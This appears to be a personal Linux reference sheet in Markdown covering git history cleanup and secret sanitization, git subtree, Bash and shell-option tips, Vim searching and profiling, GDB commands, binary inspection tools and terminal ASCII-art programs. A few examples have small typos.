- `git reflog` (*manage reflog information*)
  - `expire` (*prune older reflog entries*)
    - `--expire=<time> --all` to prune all reflog entries older than `<time>`, making them unreachable (`git gc` will automatically remove loose reflog entries when it decides to)
- `git gc` (*cleanup unnecessary files and optimize the local repository*)
  - `--prune=<date>` (*prune loose objects older than date*)
  - `--aggressive` (*more aggressively optimize the repository at the expense of taking much more time*)

## Sanitizing Secrets

**WARNING: These steps are rough and not to be followed blindly. History rewriting is highly and widely destructive. Read the official documentation carefully.**

- `git clone --mirror --no-local <local-repo-path> <mirror-repo-dest>` to clone a mirror of the local repo, which we will perform sanitization on
- `cd <mirror-repo-dest>`
- `git-filter-repo --dry-run --replace-text replacements.txt` to perform a dry-run text replacement across all files of the repo (`replacements.txt` should have one regex per line)
- `diff --color .git/filter-repo/fast-export.original .git/filter-repo/fast-export.filtered` to preview changes
- `git-filter-repo --replace-text replacements.txt` to perform the actual text replacement
- `git reflog --expire=now --all` to expire all reflog entries so they become unreachable and removable
- `git gc --prune=now --aggressive` to remove all expired reflog entries and perform aggressive repo optimizations (**NOTE:** `--aggressive` is potentially very slow for large repos)
- `git push --force --all` to overwrite all branches on the remote repo
- `git push --force --tags` to overwrite all tags on the remote repo

## `git subtree` (*merge subtrees together and split repository into subtrees*)

- Manpage
  > Subtrees allow subprojects to be included within a subdirectory of the main project, optionally including
  > the subproject’s entire history.
  >
  > For example, you could include the source code for a library as a subdirectory of your application.
  >
  > Subtrees are not to be confused with submodules, which are meant for the same task. Unlike submodules,
  > subtrees do not need any special constructions (like .gitmodules files or gitlinks) be present in your
  > repository, and do not force end-users of your repository to do anything special or to understand how
  > subtrees work. A subtree is just a subdirectory that can be committed to, branched, and merged along with
  > your project in any way you want.
- `git subtree add --prefix=<where/to/put/it> <repo> <ref>` to add a subtree within a repo

### Details

**TODO**

## `git worktree`

**TODO**

## `git submodule`

**TODO**

# Bash

- `alias`
  - `alias` to print all aliases
  - `alias <name>` to view an alias
  - `alias <name>=<command>` to set an alias
  - `unalias` to remove an alias
- `echo $RANDOM` prints a random number
- `declare` (*set variable values and attributes*; for advanced variable declaration)
- `readonly const='my constant'` to set a constant variable
- `which -a <command>` to see all paths found for a command
- `>new-file` to quickly create a new file instead of `touch new-file`
- `.bash_profile` only runs on logon (or `bash -l`)

## Rules

- **Always** quote strings, prefer single quotes
- Script Suffixes (eg, `script.sh`)
  - rwxrob argues against using suffixes for scripts, such as in "my-script**.sh**", on Unix, Linux, and Mac. His argument is that it reduces your script's portability by restricting that script to be only written in the extension's specific language (`.bash` for bash, `.py` for Python, etc).
  - Naming the script without an extension allows you to drop-in scripts written in different languages or to drop-in different binaries, especially as your project grows and you need to make changes to your infrastructure, or if your script could be placed in your system's PATH.
  - This is particularly important for larger or enterprise-level projects.
- `#!/bin/bash` vs `#!/usr/bin/env bash`
  - Using `env` in a shebang allows the first `bash` executable located in the `PATH` variable to be used if it exists. This presents a security risk as a non-system malicious `bash` can be executed. Hardcoding the default system `bash` eliminates this risk.
  - Choose based on your concerns. Generally, `env` Bash is preferred unless security is of special concern.
- `source` vs `exec` on Bash Configs
  - Instead of `source`ing your Bash configs, use `exec bash`, which will actually wholly replace the current shell and reset all state to avoid unexpected behavior and garbage buildup, including closing all processes held open by the shell.
  - Tip: Use `exec bash -l` if you're updating your `.bash_profile`.

## Shellcheck, Shell Options, and shfmt

- Use `shellcheck` on important scripts to detect errors and potential bugs
- Use `set` with options to improve safety and predictabilty of shell scripts (use within shell scripts)
  - `-o posix` to run in Posix mode
  - Some common options for safety:
    - `-e` to exit immediately if a command exits with a non-zero status
    - `-o pipefail` to exit using last nonzero status in command pipeline if present
    - `-u` to treat unset variables as an error when substituting
    - `-C` to disallow existing regular files to be overwritten by redirection of output
  - Some common options for debugging:
    - `-v` to print shell input lines as they are read
    - `-x` to print commands and their arguments as they are executed
    - `-n` to read commands but not execute them
- `shfmt` (*format shell programs*)
  - `-i <indent>` to specify indentation
  - `-w` to format the file in place (instead of writing to standard output)
  - `-d` to error with a diff of the changes

## Printing

- Some versions of `echo` allow `-e` to enable backslach escapes (eg, `echo -e 'hi\n'`), but it's not as universal `printf`, so generally prefer `printf`
- `printf "%s %10s\n" 'bob' 'alan'` -> `bob       alan` with 10 spaces in between

### Multiple Lines

- `echo -e 'line1\nline2\nline3'`  **if `-e` available**
- `printf 'line1\nline2\nline3\n'`
```bash
printf 'line1
line2
line3
'
```
```bash
echo 'line1
line2
line3
```
```bash
cat<<EOF
line1
line2
line3
EOF
```

## Expansion

- `list=(1 2 3); for i in ${list[@]}; do echo $i; done` to create and loop over an array of elements
- `var=2`
  - `echo '$var'` -> `$var`
  - `echo "$var"` -> `2`
- `echo {1..5}` -> `1 2 3 4 5`

## Loops

- `for i in 1 2 3; do echo $i; done`

## Process Substitution

- `<(command)` executes `command` in a subshell context, does not preserve calling shell variable changes, and passes the output as a file to the parent shell
  - `. <(command)` with `.` executes the output of `command` as a file in the current shell context
  ```bash
  $ cat <(echo hi;echo hi)
  hi
  hi
  ```
- `$(command)` executes `command` in a subshell context but does not preserve calling shell variable changes, and does capture the resulting output as a string
  - `./$(echo sayhi)` -> `./sayhi` -> `hi`
  - `iam=$(whoami)` -> `iam=holychowders`
  - `echo $(echo hi;echo hi)` -> `hi hi`
- `(command)` executes `command` in an isolated subshell which does not preserve shell variable changes. Output is captured, but its use is limited.
  - `(echo hi)` -> `hi`
  - `echo (echo hi)` does **not** work
  - `echo $( (echo hi) )` -> `hi`

# Vim

## Searching

`/\<word\>` with escaped `<` and `>` allow matching on whole words
`/\v<word>` with `\v` ("very magical") allows matching on whole words without escaping `<` and `>` and permits other more modern and convenient expansions

## :profile

- `:help profile` for more complete information
- `:profile start /tmp/vimprofile.log` to begin profiling session
- `:profile file *` to track and profile all scripts that get run
- `:profile func *` to track and profile all functions from profiled scripts
- `:profile dump` to write profiling data to logfile
- `:profile pause` to pause profiling and write to logfile
- `:profile continue` to continue profiling
- `:profile stop` to stop profiling and write to logfile

## Write Readonly Buffer

If you forgot to use `sudo` to open a file, you can redirect the contents of the buffer to `sudo tee` to write the file instead

`:w !sudo tee % > /dev/null`

# GDB

See the excellent GDB Quick Reference by UTexas: <https://users.ece.utexas.edu/~adnan/gdb-refcard.pdf>

## Interactive Session

### Common

- `help`
  - `help` for general help
  - `help <command>` for help on a command
  - `apropos -v <word>` for full documentation of commands related to `<word>`
- `file <program>` to load a program
- `b[reak] [file:]<function>` to break at `<function>` in `file`
- `r[un] [arguments]` to re/start the loaded program with `arguments`
- `s[tep] [count]` to step into the next instruction `count` times
- `n[ext] [count]` to step over the next instruction `count` times
- Press `Enter` to repeat the last command
- `i[nfo]`
  - `break` to list breakpoints
  - `watch` to list watchpoints
  - `locals` to list local variables
  - `args` to list arguments to current function
  - `registers` to print the state of the registers
  - `address main` to print the address of symbol `main`
  - `sharedlibrary` to print status of shared object libraries
  - `proc mappings` to list proces
- `p[rint]`
  - `<expression>` to evaluate and print `<expression>`
  - `<variable>` to print variable
    - `/d` — decimal
    - `/x` — hexadecimal
    - `/o` — octal
    - `/t` — binary
    - `/u` — unsigned decimal
    - `/c` — character
    - `/f` — floating point
- `watch`
  - `watch x` to break when symbol `x` changes
  - `watch <expression>` to break when `expression` evaluates true
- `c[ontinue]` to continue running the program if paused

### More

- `core-file <core>` to load a core dump
- `clear` to delete all breakpoints
- `delete <breakpoints>` to delete breakpoints
- `frame` to print current frame
- `bt` for backtrace
- `list .` to list current position in the source
- `disas main` to disassemble symbol `main`
- `x/10i main` to examine the first `10` lines of `i`nstructions of symbol `main` in memory

# Binary Analysis

- `ldd` (*print shared object dependencies*)
  - **WARNING(SECURITY)**: Some versions of `ldd` may try to execute the binary to resolve dependencies. Prefer `objdump -p <binary> | grep NEEDED` when working with untrusted binaries.
  - `ldd <binary>`
- `objdump` (*display information from object files*)
  - `-d` to disassemble
  - `-g` to display debugging information
  - `-h` to display summaries from each section header
  - `-f` to display overall summary from each section header
  - `-p` to display headers
  - `-s` to display full contents of each section (hex dump)
    - Use with `-j <name>` to select a particular section
    - Use with `-Z` to decompress any compressed sections
  - `-j <name>` to display information for a specific section
  - `-x` to display all header information
  - `--start-address=<address>`
  - `--stop-address=<address>`
  - Example: `objdump -p <binary> | grep NEEDED` to see shared object dependencies
- `xxd` (*make a hex dump or do the reverse*)
  - `xxd <file>` to dump hex for file
  - `-b` to dump binary instead of hex
  - `-r` to revert a patched hex dump back into binary format
- `hexdump` (*display file contents in hexadecimal, decimal, octal, or ascii*)
  - `hexdump <file>` to dump hex for file
  - `hexdump -C <file>` to display hex in canonical form (hex+ASCII)

# ASCII Art and Silly Stuff

## Static

- `toilet`
- `figlet`
- `boxes`
  - `boxes -p <design>`
    - `boxes -l` to list possible designs
    - Nice ones: `unicornthink`, `bear`, `spring`, `twisted`, `sunset`, `santa`, `cat`
  - `boxes -s <width>` to specify width
- `lolcat` (color)

## Animated

- `cmatrix`
- `cacafire` (`caca-utils`)
- **`nyancat`** (awesome)
- `asciiquarium` (run in a Fedora Docker container)
- `sl` (train)

## Combos and Best

- `echo Welcome | boxes | figlet`
- `echo Welcome back @home, holy! | boxes -d bear -s $COLUMNS`
- `echo Welcome back @home, holy! | boxes -d spring -s $((COLUMNS-9))`

# Credits

- GitHub repo: <https://github.com/holychowders/linux-reference>
- GitHub profile: <https://github.com/holychowders>
